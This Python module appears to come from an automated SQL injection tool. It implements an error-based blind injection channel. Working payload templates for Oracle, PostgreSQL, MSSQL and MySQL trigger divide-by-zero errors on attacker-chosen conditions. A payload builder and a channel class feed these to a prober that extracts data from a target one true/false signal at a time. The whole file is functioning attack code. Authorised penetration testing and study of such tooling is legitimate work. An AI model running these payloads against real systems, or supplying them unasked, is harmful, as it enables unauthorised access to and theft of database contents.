"""Error-based channel: extract data via SQL error messages.

The classic error-based technique uses a condition inside a query
that either triggers an error (TRUE) or doesn't (FALSE). The server's
error message becomes the boolean signal.

Templates live here so that error_based.py can be a thin re-export.
"""

from __future__ import annotations

from typing import Optional

from .base import Channel, ChannelInfo


# --- error templates ------------------------------------------------------
#
# Each entry: (name, dialect, template)
# {c} in template is the boolean condition.

TEMPLATES = [
    ("oracle_dual_tochar", "oracle",
     "||(SELECT CASE WHEN ({c}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||"),

    ("oracle_dual_cast", "oracle",
     "||(SELECT CASE WHEN ({c}) THEN CAST(1/0 AS NUMBER) ELSE NULL END FROM dual)||"),

    ("pg_cast_1div0", "postgres",
     "||(SELECT CASE WHEN ({c}) THEN CAST(1/0 AS int) ELSE 1 END)||"),

    ("mssql_if_1div0", "mssql",
     "; IF ({c}) SELECT 1/0--"),

    ("mysql_1div0_sub", "mysql",
     " AND (SELECT 1 FROM (SELECT 1) x WHERE ({c}) AND 1/0)--"),
]


def templates_for(dialect: str) -> list:
    d = dialect.lower()
    return [(n, t) for (n, dd, t) in TEMPLATES if dd == d]


def build_payload(template: str, condition: str,
                  prefix: str = "", suffix: str = "") -> str:
    body = template.format(c=condition)
    return f"{prefix}{body}{suffix}"


def all_error_dialects() -> list:
    return sorted({d for (_, d, _) in TEMPLATES})


class ErrorChannel(Channel):
    name = "error"

    def __init__(self, cfg, client, prober=None):
        super().__init__(cfg, client, prober)
        self.dialect: str = ""
        self.prefix: str = ""
        self.suffix: str = ""
        self.template: str = ""
        self.template_name: str = ""
        self.error_codes: tuple = (500,)

    def detect(self) -> Optional[ChannelInfo]:
        return None

    def configure(self, dialect: str, prefix: str, suffix: str,
                  template_name: str, template: str) -> None:
        self.dialect = dialect
        self.prefix = prefix
        self.suffix = suffix
        self.template = template
        self.template_name = template_name
        if self.prober is not None:
            # lazy import to avoid a cycle with auto.py
            from ..auto import DIALECT as _D
            self.prober.dialect = dialect
            self.prober.d = _D[dialect]
            self.prober.prefix = prefix
            self.prober.suffix = suffix
            self.prober.technique = "error"
            self.prober.error_template = template

    def info(self) -> ChannelInfo:
        return ChannelInfo(
            name=self.name, dialect=self.dialect,
            prefix=self.prefix, suffix=self.suffix,
            technique="error",
            notes=self.template_name,
        )

    def probe(self, condition: str) -> bool:
        if self.prober is None:
            return False
        return bool(self.prober.probe(condition))

    def _substr_fn(self) -> str:
        return "SUBSTR" if self.dialect == "oracle" else "SUBSTRING"

    def _ascii_fn(self) -> str:
        return "UNICODE" if self.dialect == "sqlite" else "ASCII"
